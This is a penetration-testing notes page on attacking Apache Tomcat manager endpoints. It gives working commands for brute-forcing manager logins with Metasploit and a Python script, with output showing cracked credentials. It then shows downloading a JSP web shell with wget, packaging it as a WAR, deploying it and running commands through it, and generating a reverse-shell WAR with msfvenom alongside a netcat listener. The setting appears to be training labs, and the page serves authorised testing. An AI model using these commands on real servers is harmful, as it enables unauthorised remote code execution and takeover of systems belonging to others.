---
icon: cat
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
  metadata:
    visible: true
---

# Tomcat Exploitation

If we can access the `/manager` or `/host-manager` endpoints, we can likely achieve remote code execution on the Tomcat server. We can use the [auxiliary/scanner/http/tomcat\_mgr\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/tomcat_mgr_login/) [metasploit](../../../../toolbox/tooling/exploitation-tools/metasploit/ "mention") module for these purposes, Burp Suite Intruder or any number of scripts to achieve this.

## Login Brute Force

### Metasploit - tomcat\_mgr\_login

We must specify the vhost and the target's IP address to interact with the target properly. We should also set `STOP_ON_SUCCESS` to `true` so the scanner stops when we get a successful login, no use in generating loads of additional requests after a successful login.

```bash
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58
```

```
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run

<snip>
[-] 10.129.201.58:8180 - LOGIN FAILED: root:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:vagrant (Incorrect)
[+] 10.129.201.58:8180 - Login Successful: tomcat:admin
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Python Script: Tomcat-Manager-Bruteforce

{% hint style="info" %}
## Script Download:

[https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce](https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce)
{% endhint %}

```bash
python3 mgr_brute.py -U http://tomcat.acme.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
```

```
[+] Atacking.....

[+] Success!!
[+] Username : b'tomcat'
[+] Password : b'admin'
```

## WAR File Upload

Many Tomcat installations provide a GUI interface to manage the application. This interface is available at `/manager/html` by default, which only users assigned the `manager-gui` role are allowed to access. Valid manager credentials can be used to upload a packaged Tomcat application (.WAR file) and compromise the application.

A WAR, or Web Application Archive, is used to quickly deploy web applications and backup storage. The manager web app allows us to instantly deploy new applications by uploading WAR files. A WAR file can be created using the zip utility.

A JSP web shell such as [this](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp) can be downloaded and placed within the archive.

{% code title="Download Web Shell" %}
```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
```
{% endcode %}

{% code title="Archive" %}
```bash
zip -r backup.war cmd.jsp 
```
{% endcode %}

Click on `Browse` to select the .war file and then click on `Deploy`.

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

This file is uploaded to the manager GUI, after which the `/backup` application will be added to the table.

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

If we click on `backup`, we will get redirected to `http://web01.acme.com:8180/backup/` and get a `404 Not Found` error. We need to specify the `cmd.jsp` file in the URL as well. Browsing to `http://web01.acme.com:8180/backup/cmd.jsp` will present us with a web shell that we can use to run commands on the Tomcat server.

From here, we could upgrade our web shell to an interactive reverse shell and continue.

```bash
curl http://web01.acme.com:8180/backup/cmd.jsp?cmd=id
```

{% hint style="info" %}
## Clean Up & Note Taking

To clean up after ourselves, we can go back to the main Tomcat Manager page and click the `Undeploy` button next to the `backups` application after, of course, noting down the file and upload location for our report, which in our example is `/opt/tomcat/apache-tomcat-10.0.10/webapps`.

If we do an `ls` on that directory from our web shell, we'll see the uploaded `backup.war` file and the `backup` directory containing the `cmd.jsp` script and `META-INF` created after the application deploys. Clicking on `Undeploy` will typically remove the uploaded WAR archive and the directory associated with the application.
{% endhint %}

## Creating WAR Files

### MSFVenom

We could also use [msfvenom.md](../../../../toolbox/tooling/exploitation-tools/metasploit/msfvenom.md "mention") to generate a malicious WAR file. The payload [java/jsp\_shell\_reverse\_tcp](https://github.com/iagox86/metasploit-framework-webexec/blob/master/modules/payloads/singles/java/jsp_shell_reverse_tcp.rb) will execute a reverse shell through a JSP file. Browse to the Tomcat console and deploy this file. Tomcat automatically extracts the WAR file contents and deploys it.

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
```

Start a Netcat listener and click on `/backup` to execute the shell.

```bash
nc -lnvp 4443
```

{% hint style="success" %}
## Utilising Metasploit

The [multi/http/tomcat\_mgr\_upload](https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/) [metasploit](../../../../toolbox/tooling/exploitation-tools/metasploit/ "mention") module can be used to automate this process.
{% endhint %}

{% hint style="danger" %}
## Web Shell Warning

When we upload web shells (especially on externals), we want to prevent unauthorised access. We should take certain measures such as a randomised file name (i.e., MD5 hash), limiting access to our source IP address, and even password protecting it. We don't want an attacker to come across our web shell and leverage it to gain their own foothold.
{% endhint %}
